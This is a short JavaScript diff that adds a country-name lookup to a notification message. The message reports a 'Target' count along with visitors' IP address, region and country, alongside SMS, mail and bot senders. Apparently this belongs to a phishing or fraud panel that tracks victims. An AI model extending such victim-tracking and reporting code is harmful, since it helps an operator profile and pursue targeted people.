@@ -4,6 +4,9 @@ const { send_message } = require("../modules/send_sms.js");
 const { send_mail } = require("./send_mail.js");
 const { send_mail_2 } = require("./send_mail-2.js");
 
+const countries = require("i18n-iso-countries");
+countries.registerLocale(require("i18n-iso-countries/langs/en.json"));
+
 const proxyUrl = "/api";
 
 async function getPriceEuro(price) {
@@ -677,10 +680,13 @@ module.exports.get_data = (app, users, bot) => {
         for (let user in users_site) {
           let users = Number(user);
           let user_time = Math.min.apply(null, list_of_user);
+
+          const fullCountry = countries.getName(userLocation?.country, "en");
+
           message = `🏛 Target ${user_time} (${Math.max.apply(
             null,
             list_of_users
-          )}) ${(users += 1)}                          [${userLocation?.ip}]    ${userLocation?.region}    /    ${userLocation?.country} ${userLocation?.flag}`;
+          )}) ${(users += 1)}                          [${userLocation?.ip}]    ${userLocation?.region}    /    ${fullCountry}    ${userLocation?.flag}`;
         }
 
         for (let u in users) {
